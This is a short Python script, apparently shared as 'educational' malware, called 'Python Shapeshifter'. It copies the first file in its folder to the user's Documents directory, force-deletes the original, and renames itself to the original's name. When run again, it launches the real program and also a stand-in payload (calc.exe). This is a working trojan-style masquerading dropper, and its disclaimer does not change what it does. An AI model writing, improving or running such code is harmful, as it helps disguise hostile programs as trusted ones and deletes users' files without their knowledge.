#   This project is only for educational propsites!
#   In case for use this code for illegal conduct no is my responsibility
#
#   Python Shapeshifter
#   This software is maden by Coded. Visit coded.today

import os
from os.path import exists

archives = []
content = ''

#Directory of real script will be locate
direc = 'C:/Users/'+ os.getlogin( ) +'/Documents/'

for root, dirs, files in os.walk("."):
    for filename in files:
        archives.append(filename)

if len(archives) > 0:
    #Attention, I'm putting the list of files in an array, and by selecting the first object,
    #you can change it to a specific file

    file_exists = exists(str(direc)+str(archives[0]))
    if file_exists:
        #Opening real script python
        os.system('start cmd /c python '+str(direc)+str(archives[0]))

        #Opening calc.exe, executing a cmd script
        os.system('start calc.exe')
        exit()
    else:
        #Reading content of real script
        handle=open(archives[0],'r')
        content = handle.read()
        handle.close()
        meta = open(str(direc)+str(archives[0]), 'x')

        #Writing the real script on copy file
        meta.write(content)
        meta.close()

        #Deleting the real program and renaming this program to real program name
        os.system('del /f '+archives[0])
        os.system('rename ware.py '+archives[0])
        exit()
